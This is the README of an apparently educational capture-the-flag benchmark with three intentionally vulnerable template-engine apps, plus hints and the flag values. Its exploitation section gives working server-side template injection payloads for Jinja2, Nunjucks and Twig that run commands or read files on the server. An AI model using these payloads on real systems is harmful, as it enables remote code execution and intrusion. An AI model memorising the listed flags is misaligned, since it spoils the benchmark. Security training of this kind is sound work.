# S7BEN-VHARD-009: Server-Side Template Injection Chain

![Difficulty](https://img.shields.io/badge/difficulty-intermediate-yellow)
![Tier](https://img.shields.io/badge/tier-2-blue)
![Category](https://img.shields.io/badge/category-web-green)

## Overview

This benchmark demonstrates Server-Side Template Injection (SSTI) vulnerabilities across three popular template engines: Python/Jinja2, Node.js/Nunjucks, and PHP/Twig. Participants will learn to identify, fingerprint, and exploit SSTI to achieve Remote Code Execution (RCE) in different language environments.

## Learning Objectives

- Understanding Server-Side Template Injection (SSTI) mechanics
- Template engine fingerprinting and detection techniques
- Exploiting Jinja2 for Python code execution
- Exploiting Nunjucks for Node.js code execution
- Exploiting Twig for PHP code execution
- Developing polyglot SSTI payloads
- Understanding template security best practices

## Architecture

```
┌─────────────────────────────────────────────────────┐
│  jinja2-app (Python/Flask)                          │
│  - Port: 5000                                       │
│  - Jinja2 template engine with SSTI                 │
│  - Flag: /app/flag.txt                              │
│  IP: 172.27.0.10                                    │
└─────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────┐
│  nunjucks-app (Node.js/Express)                     │
│  - Port: 3000                                       │
│  - Nunjucks template engine with SSTI               │
│  - Flag: /app/flag.txt                              │
│  IP: 172.27.0.20                                    │
└─────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────┐
│  twig-app (PHP/Apache)                              │
│  - Port: 8080                                       │
│  - Twig template engine with SSTI                   │
│  - Flag: /var/www/html/flag.txt                     │
│  IP: 172.27.0.30                                    │
└─────────────────────────────────────────────────────┘
```

## Vulnerabilities

| CVE/ID | Vulnerability | Severity | Description |
|--------|---------------|----------|-------------|
| CWE-94 | Code Injection | Critical | User input directly embedded in template rendering |
| CUSTOM-SSTI-01 | Jinja2 SSTI | Critical | Python RCE via Jinja2 template injection |
| CUSTOM-SSTI-02 | Nunjucks SSTI | Critical | Node.js RCE via Nunjucks template injection |
| CUSTOM-SSTI-03 | Twig SSTI | Critical | PHP RCE via Twig template injection |

## Attack Chain

1. **Phase 1**: Template Injection Discovery - Identify SSTI with basic payloads
2. **Phase 2**: Jinja2 Exploitation - Python RCE via MRO and built-in objects
3. **Phase 3**: Nunjucks Exploitation - Node.js RCE via Function constructor
4. **Phase 4**: Twig Exploitation - PHP RCE via filter functions
5. **Phase 5**: Polyglot Payloads - Universal SSTI techniques

## Flags

| Flag | Value | Engine | Difficulty |
|------|-------|--------|------------|
| FLAG_JINJA2 | `S7BEN{jinja2_ssti_python_rce_a1b2c3d4}` | Jinja2 | Medium |
| FLAG_NUNJUCKS | `S7BEN{nunjucks_ssti_nodejs_rce_e5f6g7h8}` | Nunjucks | Medium |
| FLAG_TWIG | `S7BEN{twig_ssti_php_rce_i9j0k1l2}` | Twig | Medium |

## Quick Start

### Prerequisites

- Docker and Docker Compose
- curl or HTTP client
- Basic understanding of template engines

### Build and Start

```bash
cd benchmarks/S7BEN-VHARD-009
make build
make up
```

Or manually:
```bash
docker compose build
docker compose up -d
```

### Verify Services

```bash
make test
```

Expected output:
```
Jinja2 app: healthy
Nunjucks app: healthy
Twig app: healthy
```

### Access Points

- **Jinja2 App**: http://localhost:5000
- **Nunjucks App**: http://localhost:3000
- **Twig App**: http://localhost:8080

## Exploitation Examples

### Basic SSTI Detection

```bash
# Test all three engines
curl "http://localhost:5000/greet?name={{7*7}}"  # Jinja2
curl "http://localhost:3000/greet?name={{7*7}}"  # Nunjucks
curl "http://localhost:8080/greet.php?name={{7*7}}"  # Twig
```

Expected output: `49` (instead of `{{7*7}}`)

### Jinja2 RCE

```bash
curl "http://localhost:5000/test?template={{config.__class__.__init__.__globals__['os'].popen('cat /app/flag.txt').read()}}"
```

### Nunjucks RCE

```bash
curl -G "http://localhost:3000/test" --data-urlencode "template={{range.constructor('return require(\"fs\").readFileSync(\"/app/flag.txt\",\"utf8\")')()}}"
```

### Twig RCE

```bash
curl -G "http://localhost:8080/test.php" --data-urlencode "template={{['cat /var/www/html/flag.txt']|map('system')}}"
```

## Full Testing Guide

For comprehensive exploitation instructions, see [TESTING.md](TESTING.md).

## Cleanup

```bash
make down
```

Or remove all data:
```bash
make clean
```

## Tools Required

- curl (with `-G --data-urlencode` for URL encoding)
- Burp Suite (optional)
- Python 3.x (optional for automation)

## Estimated Time

- Setup: 5-10 minutes
- Exploitation: 60-90 minutes
- Total: 65-100 minutes

## Hints

- Mathematical expressions like `{{7*7}}` indicate SSTI
- Jinja2: Access Python objects via `config`, `request`, `lipsum`
- Nunjucks: Use `range.constructor` to access Function constructor
- Twig: Use `|map`, `|filter`, `|reduce` to execute PHP functions
- URL encoding is crucial for complex payloads - use `curl -G --data-urlencode`
- Error messages often reveal the template engine

## Security Notice

⚠️ **WARNING**: This benchmark contains intentional security vulnerabilities.
- **DO NOT** deploy in production environments
- **DO NOT** expose to untrusted networks
- For educational purposes only

## References

- [PortSwigger: Server-Side Template Injection](https://portswigger.net/research/server-side-template-injection)
- [HackTricks: SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
- [PayloadsAllTheThings: SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [OWASP: Template Injection Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection)

## Tags

`ssti` `template-injection` `jinja2` `nunjucks` `twig` `rce` `python` `nodejs` `php` `code-injection` `phase-4`

## Author

Strike7 Security Benchmarks

## Version

1.0.0 (Last updated: 2026-01-14)
